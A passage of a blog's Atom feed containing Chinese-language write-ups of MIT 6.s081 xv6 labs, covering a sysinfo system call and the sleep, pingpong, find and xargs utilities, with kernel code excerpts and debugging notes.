class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/proc.c</span></span><br><span class="line">uint64 <span class="title function_">activeproc</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span>* <span class="title">p</span>;</span></span><br><span class="line">  uint64 n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">    acquire(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;state != UNUSED)</span><br><span class="line">      n += <span class="number">1</span>;</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="sys_sysinfo"><a class="markdownIt-Anchor" href="#sys_sysinfo"></a> sys_sysinfo</h2><p>实现上述两个 helper function 后，我们最终组合实现系统调用 <code>sysinfo</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/sysproc.c</span></span><br><span class="line">uint64 <span class="title function_">sys_sysinfo</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">kinfo</span>;</span></span><br><span class="line">  uint64 uinfo;        <span class="comment">// user pointer to struct sysinfo</span></span><br><span class="line">  argaddr(<span class="number">0</span>, &amp;uinfo);</span><br><span class="line"></span><br><span class="line">  kinfo.freemem = kfreemem();</span><br><span class="line">  kinfo.nproc   = activeproc();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(copyout(myproc()-&gt;pagetable, uinfo, (<span class="type">char</span>*)&amp;kinfo, <span class="keyword">sizeof</span>(kinfo)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一次实现我参照 <code>sys_fstat()</code> 把 user level 传递的参数 <code>sysinfo</code> 继续传递到 helper funcitons 里面，把填充字段的工作交给<strong>底层 utils</strong>。这不仅加大了代码的耦合性，而且由于分字段填充使用<code>copyout</code>操作起来并不优雅。因此修改为将 <code>copyout</code> 复制内核信息到用户级的过程移到了 <code>sys_sysinfo</code> 系统调用实现里，两个 helper functions 只负责收集两个字段。</p><p><img src="/2025/05/15/Lab-System%20Calls/sysinfo.png" alt="sysinfo.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Before you start coding, read Chapter 2 of the &lt;a href=&quot;https://pdos.csail.mit.edu/6.828/2023/xv6/book-riscv-rev1.pdf&quot;&gt;xv6 b</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>6.s081 Lab: Xv6 and Unix utilities</title>
    <link href="http://example.com/2025/05/06/Lab%20-%20xv6%20and%20Unix%20utilities/"/>
    <id>http://example.com/2025/05/06/Lab%20-%20xv6%20and%20Unix%20utilities/</id>
    <published>2025-05-06T09:13:39.861Z</published>
    <updated>2025-05-06T09:20:33.730Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sleep"><a class="markdownIt-Anchor" href="#sleep"></a> sleep</h1><blockquote><p>Implement a user-level <code>sleep</code> program for xv6, along the lines of the UNIX sleep command. Your sleep should pause for a user-specified number of ticks. A tick is a notion of time defined by the xv6 kernel, namely the time between two interrupts from the timer chip.</p></blockquote><p>实验要求实现一个 sleep 命令行命令<code>sleep.c</code>，在实现中调用的<code>int sleep(int)</code>是 xv6 提供的 sleep syscall 的系统调用封装，通过链接<code>user/usys.S</code>跳转到实际内核代码的实现<code>sys_sleep</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.global sleep         ; 声明 sleep 为全局符号，可供外部调用</span><br><span class="line">sleep:                ; 函数入口</span><br><span class="line">    li a7, SYS_sleep  ; 将系统调用编号（SYS_sleep）加载到寄存器 a7</span><br><span class="line">    ecall             ; 触发environmental call（即trap）</span><br><span class="line">    ret               ; 返回调用者</span><br></pre></td></tr></table></figure><p>内核的<code>sys_sleep</code>实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/sysproc.c</span></span><br><span class="line">uint64 <span class="title function_">sys_sleep</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  uint ticks0;</span><br><span class="line"></span><br><span class="line">  argint(<span class="number">0</span>, &amp;n);</span><br><span class="line">  <span class="keyword">if</span>(n &lt; <span class="number">0</span>)</span><br><span class="line">    n = <span class="number">0</span>;</span><br><span class="line">  acquire(&amp;tickslock);</span><br><span class="line">  ticks0 = ticks;</span><br><span class="line">  <span class="keyword">while</span>(ticks - ticks0 &lt; n)&#123;</span><br><span class="line">    <span class="keyword">if</span>(killed(myproc()))&#123;</span><br><span class="line">      release(&amp;tickslock);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(&amp;ticks, &amp;tickslock);</span><br><span class="line">  &#125;</span><br><span class="line">  release(&amp;tickslock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在用户态中传入的参数会通过<code>argint</code>获取，<code>n</code>即代表睡眠多少个时钟周期，每一过一个时钟周期，<code>clockintr()</code>都会使全局变量<code>ticks</code>加 1，以此模拟时间的变化。为了保护共享变量<code>ticks</code>，实现中使用了自旋锁<code>tickslock</code>来保护对变量<code>ticks</code>的读写，如前面时钟中断对<code>ticks</code>的写操作，以及上面对<code>ticks</code>的读操作。</p><p><code>acquire()</code>获得锁后，通过<code>sleep(&amp;ticks, &amp;tickslock)</code>实现单次 tick 的进程睡眠模拟。这个过程产生一个问题：进程带着锁<code>tickslock</code>睡眠，那么时钟中断就无法修改<code>ticks</code>。不过我们看<code>sleep</code>的实现可以知道，过程会先获得进程的锁<code>acquire(&amp;p-&gt;lock)</code>再释放<code>ticks</code>的锁 <code>release(lk)</code>，因此不会发生死锁！</p><p>进程的锁的作用以及<code>sleep</code>接下来的具体行为涉及 xv6 <code>process</code>进程概念的定义，会在报告后面解释分析后再回过来看<code>void sleep(void *chan, struct spinlock *lk)</code>。</p><hr><p>以下为测试结果：<br><img src="/2025/05/06/Lab%20-%20xv6%20and%20Unix%20utilities/sleep.png" alt="sleep.png"></p><h1 id="pingpong"><a class="markdownIt-Anchor" href="#pingpong"></a> pingpong</h1><blockquote><p>Write a user-level program that uses xv6 system calls to ‘‘ping-pong’’ a byte between two processes over a pair of pipes, one for each direction. The parent should send a byte to the child; the child should print “&lt;pid&gt;: received ping”, where &lt;pid&gt; is its process ID, write the byte on the pipe to the parent, and exit; the parent should read the byte from the child, print “&lt;pid&gt;: received pong”, and exit.</p></blockquote><p>注意匿名管道的数据传输是单向的，为了在父进程和子进程之间双向地传递消息，我们需要创建两个管道：一个数据从父进程流向子进程，另一个数据从子进程流向父进程。过程为：</p><ol><li>父进程发送消息给子进程</li><li>子进程读到消息并响应到终端</li><li>子进程发送消息给父进程</li><li>父进程接收消息并响应到终端</li></ol><p>第一次实现发现打印出来的消息相互交叉，产生<strong>终端输出竞争</strong>！<br><img src="/2025/05/06/Lab%20-%20xv6%20and%20Unix%20utilities/pingpong_failed.png" alt="pingpong_failed.png"><br>发现问题后我猜测了出错的可能是 xv6 提供的 <code>read</code>/<code>write</code>没有实现互斥，即不保障原子性（可能性很小…），<strong>由于 parent 和 child 之间没有同步</strong>，导致两个进程同时通过<code>printf()</code>向终端输出，导致了 race condition 。</p><p>由于我们使用管道（也是一种文件）进行读写，<code>sys_read</code>和<code>sys_write</code>分别调用的<code>fileread</code>和<code>filewrite</code>会接着调用<code>piperead</code>和<code>pipewrite</code>。在对管道进行操作之前，会尝试<code>acquire(&amp;pi-&gt;lock)</code>，因此可以保证 <code>read</code>/<code>write</code>的原子性。</p><p>既然<code>read</code>/<code>write</code>满足原子性，那就是父子进程之间同步的逻辑编写上出现了问题，于是发现确实如此：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 部分逻辑代码</span></span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">  <span class="comment">// Child process</span></span><br><span class="line">  read();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d: received ping\n&quot;</span>, getpid());</span><br><span class="line">  write();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">  <span class="comment">// Parent process</span></span><br><span class="line">  write();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d: received pong\n&quot;</span>, getpid());   <span class="comment">// Fault!!</span></span><br><span class="line">  read();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子进程调用<code>read</code>会被阻塞，但当父进程<code>write</code>时，子进程接收消息，然后两个进程同时调用<code>printf</code>向终端输出！正确的逻辑应该是父进程调用<code>read</code>被阻塞，直到子进程<code>write</code>才会调用<code>printf</code>。正确逻辑为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Parent process</span></span><br><span class="line">write();</span><br><span class="line">read();   <span class="comment">// Block until child call write to pipe</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d: received pong\n&quot;</span>, getpid());</span><br></pre></td></tr></table></figure><p><img src="/2025/05/06/Lab%20-%20xv6%20and%20Unix%20utilities/pingpong_succeed.png" alt="pingpong_succeed.png"></p><hr><p>回过头来我们再看<code>printf</code>竞争的具体过程。<code>printf</code>在<code>va_start</code>解析完参数列表后调用<code>vprintf</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// user/printf.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">vprintf</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap)</span>&#123;</span><br><span class="line">  <span class="type">char</span> *s;</span><br><span class="line">  <span class="type">int</span> c, i, state;</span><br><span class="line"></span><br><span class="line">  state = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; fmt[i]; i++)&#123;</span><br><span class="line">    c = fmt[i] &amp; <span class="number">0xff</span>;   <span class="comment">// Question</span></span><br><span class="line">    <span class="keyword">if</span>(state == <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(c == <span class="string">&#x27;%&#x27;</span>)&#123;</span><br><span class="line">        state = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        putc(fd, c);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(state == <span class="string">&#x27;%&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(c == <span class="string">&#x27;d&#x27;</span>)&#123;</span><br><span class="line">        printint(fd, va_arg(ap, <span class="type">int</span>), <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;l&#x27;</span>) &#123;</span><br><span class="line">        printint(fd, va_arg(ap, uint64), <span class="number">10</span>, <span class="number">0</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;x&#x27;</span>) &#123;</span><br><span class="line">        printint(fd, va_arg(ap, <span class="type">int</span>), <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;p&#x27;</span>) &#123;</span><br><span class="line">        printptr(fd, va_arg(ap, uint64));</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;s&#x27;</span>)&#123;</span><br><span class="line">        s = va_arg(ap, <span class="type">char</span>*);</span><br><span class="line">        <span class="keyword">if</span>(s == <span class="number">0</span>)</span><br><span class="line">          s = <span class="string">&quot;(null)&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span>(*s != <span class="number">0</span>)&#123;</span><br><span class="line">          putc(fd, *s);</span><br><span class="line">          s++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;c&#x27;</span>)&#123;</span><br><span class="line">        putc(fd, va_arg(ap, uint));</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;%&#x27;</span>)&#123;</span><br><span class="line">        putc(fd, c);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Unknown % sequence.  Print it to draw attention.</span></span><br><span class="line">        putc(fd, <span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">        putc(fd, c);</span><br><span class="line">      &#125;</span><br><span class="line">      state = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">putc</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> c)</span>&#123;</span><br><span class="line">  write(fd, &amp;c, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它将格式化字符串写入文件描述符为<code>fd</code>的文件中，在<code>printf</code>中传入 1，即标准输出。除去转义字符处理过程，<code>vprintf</code>的核心是<code>putc</code>，即单个字符的输出。<code>putc</code>调用<code>write</code>系统调用是原子的，但对整个字符串的输出不是原子的，因此上面 parent 和 child 两个<code>putc</code>流就交替在了一起并发地输出字符串。</p><blockquote><p><code>vprintf</code>中的一个疑问：<code>c = fmt[i] &amp; 0xff</code>的作用是什么？为什么不声明 <code>c</code>为 char？</p></blockquote><p><code>c</code>被声明为 int 类型，<code>fmt[i]</code>是有符号的 char 类型，如果<code>fmt[i]</code>是负数（如<code>0x80</code>），那么直接赋给 int 会进行符号扩展，导致<code>c</code>的值变为<code>0xffffff80</code>，显然不在 ASCII 编码的范围内（0~255）。 <code>fmt[i] &amp; 0xff</code>  会强制将  <code>fmt[i]</code>  转换为 ​<strong>​ 无符号 8 位值 ​</strong>​，清除高位符号扩展，确保  <code>c</code>  始终是  <code>0~255</code>  的正数。此处声明<code>c</code>为 int 是为了匹配标准库的  <code>getc</code>/<code>putc</code> 的规范 ​。</p><hr><h1 id="find"><a class="markdownIt-Anchor" href="#find"></a> find</h1><blockquote><p>Write a simple version of the UNIX <code>find</code> program for xv6: find all the files in a directory tree with a specific name.</p></blockquote><p>这个任务的完成涉及 xv6 文件系统接口以及“文件”的定义。在实现之前需要参考<code>ls</code>的实现来初步了解 file system。</p><hr><p><strong>文件描述：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//--------kernel/fs.h----------//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIRSIZ 14</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> &#123;</span></span><br><span class="line">  ushort inum;</span><br><span class="line">  <span class="type">char</span> name[DIRSIZ];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//------------------------------//</span></span><br><span class="line"><span class="comment">//--------kernel/stat.h---------//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_DIR     1   <span class="comment">// Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_FILE    2   <span class="comment">// File</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_DEVICE  3   <span class="comment">// Device</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> dev;     <span class="comment">// File system&#x27;s disk device</span></span><br><span class="line">  uint ino;    <span class="comment">// Inode number</span></span><br><span class="line">  <span class="type">short</span> type;  <span class="comment">// Type of file</span></span><br><span class="line">  <span class="type">short</span> nlink; <span class="comment">// Number of links to file</span></span><br><span class="line">  uint64 size; <span class="comment">// Size of file in bytes</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>文件名不能唯一描述文件本身，对于每个文件使用唯一的<code>inode</code>（32-bits 无符号 int）来限定。Unix 将资源视作文件，因此设备也是一种文件，通过<code>T_DEVICE</code>来定义。同时，文件夹也是一种文件（<code>T_DIR</code>），它是一个目录条目<code>dirent</code>的序列，其中每个<code>dirent</code>是<code>inode</code>引用和文件名<code>name</code>的序列对。文件状态<code>stat</code>中的字段<code>nlink</code>是指所有连接到该<code>inode</code>上的文件，对这些文件的所有操作都会映射到同一 inode 上。</p><p><strong>文件系统接口：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// system call</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span>, <span class="type">void</span>*, <span class="type">int</span>)</span>;            <span class="comment">// √</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">close</span><span class="params">(<span class="type">int</span>)</span>;                       <span class="comment">// √</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="type">int</span>)</span>;           <span class="comment">// √</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mknod</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="type">short</span>, <span class="type">short</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">unlink</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fstat</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> stat*)</span>;      <span class="comment">// √</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">link</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="type">const</span> <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">mkdir</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">chdir</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ulib.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">stat</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="keyword">struct</span> stat*)</span>;  <span class="comment">// √</span></span><br></pre></td></tr></table></figure><ol><li><code>open</code> 与 <code>fstat</code> 系统调用的解耦以及用户态<code>stat</code>库函数：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// user/ls.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ls</span><span class="params">(<span class="type">char</span> *path)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>((fd = open(path, O_RDONLY)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(fstat(fd, &amp;st) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span>(st.type)&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">case</span> T_DIR:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">while</span>(read(fd, &amp;de, <span class="keyword">sizeof</span>(de)) == <span class="keyword">sizeof</span>(de))&#123;</span><br><span class="line">      <span class="keyword">if</span>(de.inum == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      memmove(p, de.name, DIRSIZ);</span><br><span class="line">      p[DIRSIZ] = <span class="number">0</span>;</span><br><span class="line">      <span class="comment">// <span class="doctag">NOTE:</span> buf is the path to file</span></span><br><span class="line">      <span class="keyword">if</span>(stat(buf, &amp;st) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ls: cannot stat %s\n&quot;</span>, buf);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 ls 的查询文件实例中，传入的<code>path</code>会被作为<code>open</code>系统调用的参数，成功打开文件得到文件描述符（file descript）。接下来调用<code>fstat</code>的系统调用会解析该文件的状态<code>stat</code>，这里我们最关心的字段是文件类型 <code>type</code> 。</p><p>根据文件的不同类型对文件信息的输出也不同。如果是文件目录的话，我们需要遍历该目录：<code>while(read(fd, &amp;de, sizeof(de)) == sizeof(de))</code>。每次<code>read</code>读取一个目录条目并写在 <code>struct stat de</code>中。之后一系列对<code>buf</code>写入的结果是它保存了源目录下的单个文件（当然它可以是文件，设备或者子目录）。</p><p>为了继续读取该文件的状态，原本应该像一开始一样先打开文件再解析，而 <code>ls</code> 直接调用了一个库函数 <code>stat</code>，它实际上就是封装了 <code>open</code> ，<code>fstat</code> 和 <code>close</code> 三个 syscall 。</p><ol start="2"><li>再看系统调用 <code>read</code></li></ol><ul><li>对于文件的 read：<br>在<code>find</code>的实现中，对于<code>T_FILE</code>的处理我照搬了 <code>read(fd, &amp;de, sizeof(de))</code> ，使得查询逻辑出错。实际上对于 file 我没有必要去解析文件状态（需要的话实际上也因该是用 <code>stat</code> ），直接提取 <code>path</code> 中的 base name 就行了。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> T_FILE:</span><br><span class="line">  p = path + <span class="built_in">strlen</span>(path) - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(*p != <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">p--;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">strcmp</span>(p+<span class="number">1</span>, filename) == <span class="number">0</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, path);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><ul><li>对于设备文件的<code>read</code>：<br>一开始我忘记了还有设备这种文件，于是每次读到<code>/console</code>都会跳到我的 default 语句。后面意识到后把 <code>T_DEVICE</code> 的处理和 <code>T_FILE</code> 和到了一起，而我的 file 处理逻辑中又有错误的 <code>read</code>，此时出现一个巨大的 error ：<code>read</code> 读取设备文件不会通过文件系统，而是调用的设备驱动程序，产生阻塞！因此每次读到<code>/console</code>就卡死了 😦</li></ul><hr><p>了解了 xv6 基本的文件系统定义 <code>find</code> 的处理逻辑就很清晰了，其实和 <code>ls</code> 的差别只在对于 file 和 device 我们不用解析文件状态。根据最初的 path 我们解析查看文件类型：如果是设备或者文件，我们匹配 file name 并直接打印路径；如果是文件目录，我们则需要循环读取每一个条目并递归 <code>find</code> 。</p><p>实践中有一个点我没有注意到，那就是目录文件的序列中有两个条目，分别是当前目录 <code>&quot;.&quot;</code> 和上一个目录 <code>&quot;..&quot;</code> ，不能递归进去！实际上 Lab 对此行为有提醒：</p><blockquote><p><strong>Don’t recurse into “.” and “…”.</strong></p></blockquote><p><img src="/2025/05/06/Lab%20-%20xv6%20and%20Unix%20utilities/find.png" alt="find.png"></p><h1 id="xargs"><a class="markdownIt-Anchor" href="#xargs"></a> xargs</h1><blockquote><p>Write a simple version of the UNIX xargs program for xv6: its arguments describe a command to run, it reads lines from the standard input, and it runs the command for each line, appending the line to the command’s arguments.</p></blockquote><p>这里我没有理解好 <code>xargs</code> 的功能，误以为把所有的 stdin 结合起来然后传递到下一个指令作为参数。实际上应该每读取一行作为一个 append 的参数执行 <code>xargs</code> 后面的指令。</p><p>举个例子:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> from world | xargs <span class="built_in">echo</span> hello</span><br></pre></td></tr></table></figure><p>这里第一个 <code>echo</code> 会输出到 stdout <code>from world\n</code>，<code>xargs</code> 从标准输入中读取一行，然后加在 <code>echo hello</code> 这个“命令”后面，形成 <code>echo hello from world\n</code>。</p><p>注意每次读取一行都需要去除末尾的换行符，同时注意传递给 <code>exec</code> 的 <code>argv[]</code> 的最后一个参数得是 <code>NULL</code> ！<br><img src="/2025/05/06/Lab%20-%20xv6%20and%20Unix%20utilities/xargs.png" alt="xargs.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sleep&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#sleep&quot;&gt;&lt;/a&gt; sleep&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Implement a user-level &lt;code&gt;sleep&lt;/code&gt; program </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SYSU W4terCTF 2025</title>
    <link href="http://example.com/2025/04/28/SYSU%20W4terCTF%202025/"/>
